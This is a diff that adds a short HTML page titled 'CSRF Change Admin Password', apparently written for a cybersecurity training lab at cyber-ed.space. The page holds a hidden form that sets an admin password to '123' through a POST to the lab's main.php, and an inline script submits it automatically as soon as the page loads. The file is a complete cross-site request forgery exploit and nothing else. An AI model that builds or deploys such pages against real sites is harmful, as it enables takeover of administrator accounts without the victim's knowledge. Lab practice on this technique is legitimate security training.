@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF Change Admin Password</title></head>
+<body>
+<form id="csrfChangePass" action="http://web.oz8k2ccown3vccx9lfv0.labs.cyber-ed.space/main.php" method="POST">
+  <input type="hidden" name="action" value="change_password">
+  <input type="hidden" name="new_password" value="123">
+</form>
+<script>
+  document.getElementById('csrfChangePass').submit();
+</script>
+</body>
+</html>
